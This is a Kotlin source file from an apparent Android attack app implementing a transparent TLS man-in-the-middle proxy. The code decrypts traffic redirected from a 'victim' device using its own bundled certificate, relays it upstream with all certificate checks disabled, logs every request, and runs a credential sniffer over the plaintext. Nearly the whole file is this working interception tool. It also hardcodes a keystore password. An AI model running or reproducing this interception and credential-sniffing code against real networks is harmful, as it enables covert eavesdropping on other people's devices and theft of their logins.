package com.winarp.mobile.net

import android.content.Context
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.net.InetSocketAddress
import java.net.ServerSocket
import java.net.Socket
import java.security.KeyStore
import java.security.cert.X509Certificate
import javax.net.ssl.KeyManagerFactory
import javax.net.ssl.SNIHostName
import javax.net.ssl.SNIMatcher
import javax.net.ssl.SNIServerName
import javax.net.ssl.SSLContext
import javax.net.ssl.SSLServerSocket
import javax.net.ssl.SSLSocket
import javax.net.ssl.StandardConstants
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager
import kotlin.concurrent.thread

/**
 * Transparent TLS MITM proxy. Forwarded victim :443 is REDIRECTed here; we terminate TLS with our
 * own cert (assets/mitm.p12), read the SNI to learn the real host, open an upstream TLS connection
 * to it, and relay — logging the decrypted request line + Host. Devices that don't validate certs
 * (a large share of IoT / Android-TV apps) are decrypted with no client change; devices where the
 * user installs our CA (mitm_ca.pem) are decrypted for non-pinned apps. Pinned apps still fail.
 * HTTP/1.1 only (ALPN forced) so the plaintext is trivially parseable.
 */
class TlsMitm {

    private companion object {
        const val CONNECT_TIMEOUT_MS = 8000
        const val HANDSHAKE_TIMEOUT_MS = 15000
    }

    private val _running = MutableStateFlow(false)
    val running: StateFlow<Boolean> = _running.asStateFlow()

    private var server: ServerSocket? = null
    private var onLine: ((String) -> Unit)? = null
    @Volatile private var serverCtx: SSLContext? = null

    private val trustAll = arrayOf<TrustManager>(object : X509TrustManager {
        override fun checkClientTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
        override fun checkServerTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
        override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
    })

    fun start(context: Context, port: Int, log: (String) -> Unit): String? {
        stop()
        onLine = log
        return try {
            val ks = KeyStore.getInstance("PKCS12")
            context.applicationContext.assets.open("mitm.p12").use { ks.load(it, "winarp123".toCharArray()) }
            val kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm())
            kmf.init(ks, "winarp123".toCharArray())
            val ctx = SSLContext.getInstance("TLS")
            ctx.init(kmf.keyManagers, null, null)
            serverCtx = ctx

            val ss = ServerSocket()
            ss.reuseAddress = true
            ss.bind(InetSocketAddress(port))
            server = ss
            _running.value = true
            thread(name = "tls-mitm-accept") {
                while (true) {
                    val raw = try { ss.accept() } catch (_: Throwable) { break }
                    thread(name = "tls-conn") { handle(raw) }
                }
            }
            null
        } catch (t: Throwable) {
            _running.value = false
            t.message ?: "tls proxy failed to start"
        }
    }

    fun stop() {
        try { server?.close() } catch (_: Throwable) {}
        server = null
        _running.value = false
    }

    private fun handle(raw: Socket) {
        var victim: SSLSocket? = null
        var upstream: SSLSocket? = null
        var sni: String? = null
        try {
            val ctx = serverCtx ?: return
            val matcher = CapturingSNIMatcher()
            val vs = ctx.socketFactory.createSocket(raw, null, raw.port, true) as SSLSocket
            victim = vs
            vs.setUseClientMode(false)
            val vp = vs.getSSLParameters()
            vp.setSNIMatchers(listOf(matcher))
            vp.setApplicationProtocols(arrayOf("http/1.1"))
            vs.setSSLParameters(vp)
            // bound the handshake so a stalled/validating client can't pin a thread forever
            raw.soTimeout = HANDSHAKE_TIMEOUT_MS
            try {
                vs.startHandshake()
            } catch (t: Throwable) {
                // The client parsed our ClientHello (so we know the SNI) but refused our cert:
                // this is a pinned / cert-validating app (banking, Facebook, Instagram, ...) that
                // does NOT trust our CA. Surface it honestly instead of a silent drop.
                val h = matcher.host
                if (h != null) onLine?.invoke("[TLS] $h — client rejected our cert (install our CA, or it's pinned)")
                else onLine?.invoke("[TLS] client dropped before SNI (${t.javaClass.simpleName})")
                vs.close(); return
            }
            raw.soTimeout = 0
            val host = matcher.host ?: run { onLine?.invoke("[TLS] no SNI in ClientHello — cannot route"); vs.close(); return }
            sni = host

            // upstream: connect with a timeout, then layer TLS over the connected socket
            val up = SSLContext.getInstance("TLS")
            up.init(null, trustAll, null)
            val plain = Socket()
            try {
                plain.connect(InetSocketAddress(host, 443), CONNECT_TIMEOUT_MS)
            } catch (t: Throwable) {
                onLine?.invoke("[TLS] $host — upstream unreachable (${t.javaClass.simpleName})")
                closeQuiet(plain); vs.close(); return
            }
            val us = up.socketFactory.createSocket(plain, host, 443, true) as SSLSocket
            upstream = us
            val upp = us.getSSLParameters()
            upp.setServerNames(listOf(SNIHostName(host)))
            upp.setApplicationProtocols(arrayOf("http/1.1"))
            us.setSSLParameters(upp)
            plain.soTimeout = HANDSHAKE_TIMEOUT_MS
            us.startHandshake()
            plain.soTimeout = 0

            val vIn = victim.inputStream; val vOut = victim.outputStream
            val uIn = upstream.inputStream; val uOut = upstream.outputStream
            val v = victim; val u = upstream
            // upstream -> victim: log each response status line as it flows back
            thread(name = "tls-down") { pump(uIn, vOut) { logResponse(host, it) }; closeQuiet(v); closeQuiet(u) }
            // victim -> upstream: log EVERY request (keep-alive reuses the connection), then relay
            val buf = ByteArray(16384)
            while (true) {
                val n = vIn.read(buf)
                if (n < 0) break
                val text = String(buf, 0, n, Charsets.ISO_8859_1)
                logRequest(host, text)
                for (cred in CredSniffer.scanText(host, text)) onLine?.invoke(cred)
                uOut.write(buf, 0, n); uOut.flush()
            }
        } catch (t: Throwable) {
            // upstream TLS handshake or relay failure after we already answered the victim
            onLine?.invoke("[TLS] ${sni ?: "?"} — relay failed (${t.javaClass.simpleName}: ${t.message ?: "-"})")
        } finally {
            closeQuiet(victim); closeQuiet(upstream); closeQuiet(raw)
        }
    }

    // Only a genuine HTTP/1.x request line: METHOD SP target SP HTTP/1.x. Avoids logging mid-stream
    // body bytes as if they were requests now that we scan every read (keep-alive).
    private val requestLine = Regex("""^([A-Z]{3,7}) (\S+) HTTP/1\.[01]""")
    private val statusLine = Regex("""^HTTP/1\.[01] (\d{3})""")

    private fun logRequest(host: String, head: String) {
        val line = head.substringBefore("\r\n")
        val m = requestLine.find(line) ?: return
        onLine?.invoke("[TLS] ${m.groupValues[1]} https://$host${m.groupValues[2]}")
    }

    private fun logResponse(host: String, head: String) {
        val line = head.substringBefore("\r\n")
        val m = statusLine.find(line) ?: return
        onLine?.invoke("[TLS]   → ${m.groupValues[1]} ($host)")
    }

    private fun pump(inp: java.io.InputStream, out: java.io.OutputStream, peek: ((String) -> Unit)? = null) {
        val b = ByteArray(16384)
        try {
            while (true) {
                val n = inp.read(b)
                if (n < 0) break
                if (peek != null) peek(String(b, 0, n.coerceAtMost(512), Charsets.ISO_8859_1))
                out.write(b, 0, n); out.flush()
            }
        } catch (_: Throwable) {
        }
    }

    private fun closeQuiet(c: java.io.Closeable?) {
        try { c?.close() } catch (_: Throwable) {}
    }

    private class CapturingSNIMatcher : SNIMatcher(StandardConstants.SNI_HOST_NAME) {
        var host: String? = null
        override fun matches(serverName: SNIServerName): Boolean {
            if (serverName is SNIHostName) host = serverName.asciiName
            return true
        }
    }
}
